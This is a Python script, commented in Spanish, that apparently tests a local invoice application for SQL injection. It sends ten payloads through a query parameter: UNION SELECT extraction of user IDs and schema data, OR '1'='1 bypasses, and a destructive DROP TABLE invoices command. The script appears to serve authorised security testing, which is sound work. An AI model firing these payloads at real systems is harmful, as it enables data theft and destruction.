#!/usr/bin/env python3
"""
Script para probar vulnerabilidad de inyección SQL
Uso: python3 test_sql_injection.py
"""

import requests
import json
import sys
import urllib.parse

# Configuración
BASE_URL = "http://localhost:5000"
USERNAME = "test"
PASSWORD = "password"

def login():
    """Obtener token de autenticación"""
    url = f"{BASE_URL}/auth/login"
    data = {"username": USERNAME, "password": PASSWORD}
    
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            return response.json()["token"]
        else:
            print(f"Error en login: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error de conexión: {e}")
        return None

def test_sql_injection(token, payload, description):
    """Probar un payload de inyección SQL específico"""
    print(f"\n🔍 Probando: {description}")
    print(f"Payload: {payload}")
    
    # URL encode el payload
    encoded_payload = urllib.parse.quote(payload)
    url = f"{BASE_URL}/invoices?status={encoded_payload}&operator=="
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(url, headers=headers)
        print(f"Status: {response.status_code}")
        
        if "UNION" in response.text or "SELECT" in response.text:
            print("🚨 VULNERABILIDAD CONFIRMADA: Inyección SQL exitosa")
            print(f"Respuesta: {response.text[:300]}...")
            return True
        elif "syntax error" in response.text.lower():
            print("⚠️  Error de sintaxis SQL - Posible inyección")
            print(f"Respuesta: {response.text[:200]}...")
            return True
        else:
            print("❌ No se detectó inyección SQL")
            return False
            
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def main():
    print("🔍 Probando vulnerabilidad de inyección SQL...")
    
    # Obtener token
    token = login()
    if not token:
        print("❌ No se pudo obtener token de autenticación")
        sys.exit(1)
    
    print("✅ Token obtenido")
    
    # Payloads de prueba
    payloads = [
        ("paid' OR '1'='1", "Bypass de autenticación básico"),
        ("paid' UNION SELECT 1,2,3,4,5--", "Extracción de datos básica"),
        ("paid' UNION SELECT id,id,id,id,id FROM users--", "Extracción de IDs de usuarios"),
        ("paid'; DROP TABLE invoices; --", "Eliminación de tabla (DESTRUCTIVO)"),
        ("paid' UNION SELECT table_name,column_name,data_type,null,null FROM information_schema.columns--", "Extracción de estructura de BD"),
        ("paid' AND 1=1", "Prueba de lógica booleana"),
        ("paid' AND 1=2", "Prueba de lógica booleana negativa"),
        ("paid' OR 1=1--", "Comentario SQL"),
        ("paid' /*", "Comentario SQL multilínea"),
        ("paid' || 'test'", "Concatenación SQL")
    ]
    
    vulnerable_count = 0
    
    for payload, description in payloads:
        if test_sql_injection(token, payload, description):
            vulnerable_count += 1
    
    print(f"\n🎯 Resumen:")
    print(f"Payloads probados: {len(payloads)}")
    print(f"Vulnerabilidades encontradas: {vulnerable_count}")
    
    if vulnerable_count > 0:
        print("🚨 VULNERABILIDAD DE INYECCIÓN SQL CONFIRMADA")
        print("📋 Archivo vulnerable: services/backend/src/services/invoiceService.ts:19")
        print("💀 Impacto: Acceso no autorizado a datos, extracción de información")
    else:
        print("✅ No se encontraron vulnerabilidades de inyección SQL")

if __name__ == "__main__":
    main()
